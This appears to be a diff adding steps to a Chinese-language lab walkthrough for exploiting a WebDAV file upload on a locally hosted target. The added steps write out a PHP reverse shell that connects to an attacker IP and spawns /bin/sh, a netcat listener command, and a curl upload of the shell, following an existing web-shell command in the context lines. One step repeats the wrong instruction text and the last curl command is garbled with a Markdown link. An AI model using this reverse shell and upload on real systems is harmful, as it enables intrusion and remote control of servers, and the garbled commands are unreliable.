@@ -85,6 +85,35 @@
      curl http://127.0.0.1:10088/shell.php?cmd=whoami
      ```
    - 若返回執行結果（例如 Apache 的運行使用者），則表示成功利用漏洞執行命令。
+  
+2. **準備反向 Shell PHP 檔案：**  
+   - 新增一個檔案名為 `reverse_shell.php`，內容如下（根據你的實際環境修改 IP 與 port）：
+   ```php
+   <?php
+   // reverse_shell.php：反向 shell 例子
+   // 修改 "192.168.1.24" 為你的攻擊機 IP，以及 "4444" 為監聽的 port
+   $sock = fsockopen("192.168.1.24", 4444);
+   if ($sock) {
+       exec("/bin/sh -i <&3 >&3 2>&3");
+   }
+   ?>
+
+3. **攻擊機準備工作：**
+   - 打開一個 Terminal，在攻擊機（例如 Kali VM）上啟動 Netcat 監聽 4444 端口：
+   ```
+   nc -nvlp 4444
+   ```
+
+4. **上傳 reverse_shell.php 到目標網站：**
+   - 打開一個 Terminal，在攻擊機（例如 Kali VM）上啟動 Netcat 監聽 4444 端口：
+   ```bash
+     curl -T reverse_shell.php http://127.0.0.1:10088/dav/
+     ```
+   - 透過瀏覽器執行 reverse_shell.php：
+   ```bash
+     curl [-T reverse_shell.php http://127.0.0.1](http://目標IP/upload/reverse_shell.php)
+     ```
+   - 確認連線：如果反向連線成功，你的 Netcat 終端機會顯示來自目標系統的連線，並進入一個 shell。
 
 ---
 
